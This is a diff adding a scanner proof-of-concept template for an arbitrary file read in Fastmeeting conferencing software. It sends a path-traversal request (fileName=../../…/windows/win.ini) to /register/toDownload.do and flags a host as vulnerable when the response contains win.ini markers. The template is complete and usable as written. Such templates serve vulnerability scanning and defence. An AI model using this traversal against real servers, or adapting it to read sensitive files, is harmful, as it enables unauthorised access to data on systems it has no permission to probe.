@@ -1,0 +1,16 @@
+name: Fastmeeting Arbitrary File Read
+manual: true
+query: body="深圳银澎云计算有限公司"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b"[fonts]") && response.body.bcontains(b"[extensions]")
+expression: r0()
+detail:
+  links:
+  - https://mp.weixin.qq.com/s/fMNE1PF5n81O1BpoDRlYkA
+  description: hst
+  tags: fileread
